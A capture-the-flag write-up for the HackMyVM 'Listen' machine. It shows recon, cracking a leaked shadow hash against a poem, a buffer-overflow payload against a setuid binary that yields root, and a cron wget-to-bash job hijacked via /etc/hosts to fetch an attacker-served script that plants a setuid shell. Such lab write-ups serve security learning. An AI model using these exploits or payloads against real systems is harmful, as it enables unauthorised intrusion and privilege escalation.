# Listen

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.195:22
Open 10.0.2.195:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.195
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfYzBJQsUZrqSGhBjydbjtAuxvwq/5PTn9cKOuRU3cX0PvqfV4TOIdbAhysBsQfoAezIuKQSky/KbmLZCdAxzLWvNROwtHdyVIUI4PmMWpqVeO/AxPFgKzlLcW1q/CSWAtyUdNUbFGTxidKlBduWppBufd74VupdA/aOTeqH8JWHCvJjfjRBvKohMR0oAM21ezNDSw1FrJ9pxpv90gPyqTX/9TA5J0XopnsDFMbzjTj0/aEiFrTmIOWvq9IlkEoIaSPq+raInzbhy3UTzJmAxl0bb0yM3+uWeu3IEp+i9+cGxtf5vgNwiRkdAI3Ki6QHjrSHsFQ1m7o/fV83e/BZlX
|   256 3e:1f:c9:eb:c0:6f:24:06:fc:52:5f:2f:1b:35:33:ec (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKCfpcXOvl2zgP5HXJMxdKvTg3lsZ50vTDc76l1MehwnvWf1y7XsyAtheRg4heZYt63CxxBs6Bsf1PdEbRSF4tE=
|   256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILxmQFkVzRqAQH1sdqxSGaIS5QDjKFKCSgpZhE9I5qWO
80/tcp open  http    syn-ack nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

```bash
└─$ curl http://10.0.2.195/
<pre>
<h1> Please Listen </h1>
When I ask you to listen to me
and you start giving me advice,
You have not done what I asked.

When I ask you to listen to me
and you begin to tell me why
I shouldnt feel that way,
you are trampling on my feelings.

When I ask you to listen to me
and you feel you have to do something
to solve my problem,
you have failed me,
strange as that may seem.

Listen! All I ask is that you listen.
Dont talk or do, just hear me…

And I can do for myself; I am not helpless.
Maybe discouraged and faltering,
but not helpless.

When you do something for me that I can and need to do for myself,
you contribute to my fear and
Inadequacy.

But when you accept as a simple fact
That I feel what I feel,
No matter how irrational,
Then I can stop trying to convince
You and get about this business
Of understanding whats behind
This irrational feeling.

And when thats clear, the answers are obvious and I dont need advice.
Irrational feelings make sense when
we understand whats behind them.

So please listen, and just hear me.
And if you want to talk, wait a minute
for your turn, and I will listen to you.

-Leo Buscaglia
</pre>


<!--
Leo please, stop using your poems as password!
leo:$6$GyxLtjMYaQWxRxfl$w0mjIXfmU1T8bac2HgweZmxgFjGSiX8kbPDWhJzAzFn.BFk9X9fPT6DHXlp.A3J5yA64qQJH6Iu4K4AW4THIw.:18551:0:99999:7:::
-->
```

```bash
└─$ curl http://10.0.2.195/ -s | htmlq pre -tw > poem.txt
└─$ john --wordlist=poem.txt leo.hash

└─$ cat poem.txt | tr ' ,;.!?…' '\n' | grep -v '^$' | sort -u > words.txt
└─$ john --wordlist=words.txt leo.hash
contribute       (leo)
```

## SSH

```bash
└─$ sshpass -p 'contribute' ssh leo@10.0.2.195
leo@listen:~$ id
uid=1001(leo) gid=1001(leo) groups=1001(leo)
```

## Privilege Escalation

```bash
leo@listen:~$ ls -lh poem
-rwsrws--- 1 root leo 17K Oct 16  2020 poem
leo@listen:~$ file poem
poem: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=25ff2d15c48083f9091df18cd42f240457f745d3, not stripped
---
└─$ sshpass -p 'contribute' scp leo@10.0.2.195:poem .
```

- [https://dogbolt.org/?id=801ba8c3-fa19-4497-a78f-fe99c2eed9e5#Hex-Rays=161](https://dogbolt.org/?id=801ba8c3-fa19-4497-a78f-fe99c2eed9e5#Hex-Rays=161)

![writeup.png](/assets/pentest/hackmyvm/listen/writeup.png)

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char buf[108];
    int check;

    printf("Ask me:\n ");
    scanf("%s", buf);

    if (check == 5880) { setuid(0); setgid(0); system("/bin/bash"); } 
    else { puts("\nWhy"); }

    return 0;
}
```

To win the check we need to overflow the buffer and write into `check` variable, it can be done so. However there's one more problem, shell exits the program right away and we lose rootbash, use `cat` trick to halt program from exiting and giving you access to rootbash.
```bash
leo@listen:~$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*108 + b"\xf8\x16\x00\x00")' | ./poem
Ask me:
 leo@listen:~$
leo@listen:~$ (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*108 + b"\xf8\x16\x00\x00\n")'; cat) | ./poem
Ask me:
id
uid=0(root) gid=0(root) groups=0(root),1001(leo)
```

### Flags

```bash
root@listen:~# cat /home/listen/user.txt
HMVimlistening
root@listen:~# cat /root/root.txt
HMVthxforlisten
```

## P.S.

After looking over some files maybe SUID binary should not have been root owned?

```python
root@listen:~# cat knockme.py
from socket import *
cs = socket(AF_INET, SOCK_DGRAM)
cs.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
cs.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
cs.sendto('Knock me to port 1337', ('255.255.255.255', 54545))

root@listen:~# cat silence.py
import time
from socket import *

cs = socket(AF_INET, SOCK_DGRAM)
cs.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
cs.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
while True:
	cs.sendto('silence/listentome', ('255.255.255.255', 54545))
	time.sleep(30)
```

![writeup-1.png](/assets/pentest/hackmyvm/listen/writeup-1.png)

![writeup-2.png](/assets/pentest/hackmyvm/listen/writeup-2.png)

```bash
root@listen:/home/listen# cat /var/spool/cron/crontabs/root
* * * * * /usr/bin/python2.7 /root/knockme.py
* * * * * sh /home/silence/listen.sh
* * * * * sh /home/listen/listentome.sh
```

```bash
root@listen:/home/listen# grep 1337 /etc -Rn
/etc/knockd.conf:6:        sequence = 1337

root@listen:/home/listen# cat /etc/knockd.conf

[options]
        UseSyslog
        Interface = enp0s3
[openSSH]
        sequence = 1337
        seq_timeout = 15
        tcpflags = syn
        start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT;/sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT;/usr/bin/python2.7 /root/silence.py
```

Oh well I think when I used `rustscan` I scanned all ports and disabled firewall without even me knowing it :D
If port 1337 is "knocked" then SSH and HTTP become accessible which previously it was not.

Also the UDP was sending credentials over network...
```bash
└─$ sshpass -p 'listentome' ssh silence@10.0.2.195
silence@listen:~$ id
uid=1000(silence) gid=1000(silence) groups=1000(silence),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

Low privileged user `leo` can read contents of `listen` scripts, but not `silence`
```bash
leo@listen:/home$ find . -type f -ls 2>/dev/null | grep -vE 'bash|profile'
     5617      4 -rw-------   1 listen   listen         15 Oct 16  2020 ./listen/user.txt
     5524      4 -rw-------   1 listen   listen          8 Oct 16  2020 ./listen/password.txt
     5625      4 -rw-r--r--   1 root     root           46 Oct 16  2020 ./listen/listentome.sh
       27     20 -rwsrws---   1 root     leo         16872 Oct 16  2020 ./leo/poem
     5547      4 -rw-------   1 silence  silence       260 Oct 16  2020 ./silence/.Xauthority
     5608      4 -rw-r-----   1 root     silence        53 Oct 16  2020 ./silence/listen.sh
     5609      4 -rw-rw----   1 silence  silence        64 Oct 16  2020 ./silence/note.txt
```

`DNS` is writable by `listen` user and it points to the host itself
```bash
leo@listen:/home$ cat ./listen/listentome.sh
wget -O - -q http://listen/ihearyou.sh | bash
leo@listen:/home$ ls -alh /etc/hosts
-rw-rw-r-- 1 root listen 186 Oct 16  2020 /etc/hosts
leo@listen:/home$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	listen
```

`listen` user password is also broadcasted
```bash
silence@listen:~$ cat note.txt
"listen" told me that if I listen, I will hear his password....
silence@listen:~$ cat listen.sh
#!/bin/sh
cat /home/listen/password.txt > /dev/pts/4
```

SSH few times till you get to `TTY 4`
```bash
silence@listen:~$ w

 03:36:01 up 48 min,  3 users,  load average: 0.08, 0.02, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
silence  pts/0    10.0.2.149       03:32   47.00s  0.24s  0.03s python3 -c import pty; pty.spawn('/bin/bash')
root     pts/1    10.0.2.149       03:05    8:33   0.31s  0.31s -bash
silence  pts/4    10.0.2.149       03:35    0.00s  0.13s  0.01s w
silence@listen:~$ shhhhhh
```

Password was written into terminal `shhhhhh`

```bash
└─$ sshpass -p 'shhhhhh' ssh listen@10.0.2.195
listen@listen:~$ id
uid=1002(listen) gid=1002(listen) groups=1002(listen)
```

Edit DNS
```bash
listen@listen:~$ nano /etc/hosts
127.0.0.1	localhost
10.0.2.149	listen
```

```bash
└─$ echo 'install -m4777 /bin/bash /tmp/rootbash' > ihearyou.sh
└─$ serve
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
---
# Wait a bit
---
listen@listen:~$ /tmp/rootbash -p
rootbash-5.0# id
uid=1002(listen) gid=1002(listen) euid=0(root) groups=1002(listen)
```
